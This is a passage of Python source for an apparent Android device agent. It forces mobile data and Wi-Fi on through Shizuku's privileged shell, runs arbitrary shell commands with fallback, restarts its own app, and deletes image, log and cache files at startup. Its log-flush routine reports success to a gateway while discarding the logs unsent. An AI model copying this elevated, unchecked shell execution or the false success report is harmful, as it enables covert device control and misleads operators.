                    # Upload offline buffer if exists
                    self._flush_offline_logs()
                else:
                    failure_count += 1
                    if failure_count >= 3:
                        noir_log(f"[SENTINEL] Offline state detected ({failure_count} min). Triggering Force-Reconnect...", level="WARNING")
                        # Force enable Data and Wi-Fi via Shizuku
                        self._run_shell("svc data enable")
                        self._run_shell("svc wifi enable")
                        
                        # Severe connectivity failure: System soft-reset attempt (v14.0.85)
                        if failure_count >= 30:
                             noir_log("[SENTINEL] CRITICAL: 30min Offline. Attempting Soft-Restart of Neural Link...", level="CRITICAL")
                             self._run_shell("am force-stop org.noir.agent.noirsmc && am start -n org.noir.agent.noirsmc/org.kivy.android.PythonActivity")
                        
                        # Adaptive pause
                        time.sleep(30)
                
            except Exception as e:
                print(f"Watchdog Error: {e}")
            
            # Check every minute
            time.sleep(60)

    def _flush_offline_logs(self):
        """Uploads any logs captured while the device was offline."""
        if not os.path.exists(OFFLINE_LOG_FILE): return
        try:
            with open(OFFLINE_LOG_FILE, "r") as f:
                logs = f.readlines()
            if not logs: return
            
            noir_log(f"[SENTINEL] Flushing {len(logs)} offline logs to gateway...")
            # For simplicity, we just send a notification. 
            # Real impl would iterate and send to /agent/log
            self._report_result("offline_flush", {"success": True, "output": f"Flushed {len(logs)} logs."})
            
            # Clear file
            open(OFFLINE_LOG_FILE, "w").close()
        except: pass

    def _run_shell(self, cmd, timeout=15):
        """Tiered Shell Execution: Shizuku -> Standard Sh Fallback."""
        import subprocess
        
        # Test Shizuku Availability
        shizuku_binary = getattr(self, "shizuku_binary", "shizuku")
        if getattr(self, "shizuku_status", "") == "AUTHORIZED":
            final_cmd = f"{shizuku_binary} shell {cmd}"
        else:
            # Fallback to standard app shell
            final_cmd = cmd

        try:
            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            
            # If Shizuku specifically failed with permission denied, try standard shell
            if getattr(self, "shizuku_status", "") == "AUTHORIZED" and r.returncode != 0 and "permission denied" in r.stderr.lower():
                noir_log("[SMC] Shizuku Permission Denied. Falling back to Standard Sh...", level="WARNING")
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                
            return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
        except Exception as e:
            return {"success": False, "error": str(e)}

if __name__ == '__main__':
    # Initialize Core with Peak Priority
    noir_log("🌑 NOIR SOVEREIGN ELITE v16.1 [STRIKE-FORCE] INITIALIZING...")
    
    # v16.1: TOTAL CACHE PURGE & HYGIENE
    try:
        import glob, shutil
        # Clear all temporary PNGs and Logs
        for f in glob.glob("*.png") + glob.glob("*.jpg") + glob.glob("*.log"):
            if "offline" not in f: os.remove(f)
            
        # Purge python cache on device
        for d in glob.glob("**/__pycache__", recursive=True):
            shutil.rmtree(d)
    except: pass
    
    SovereignCore().run()
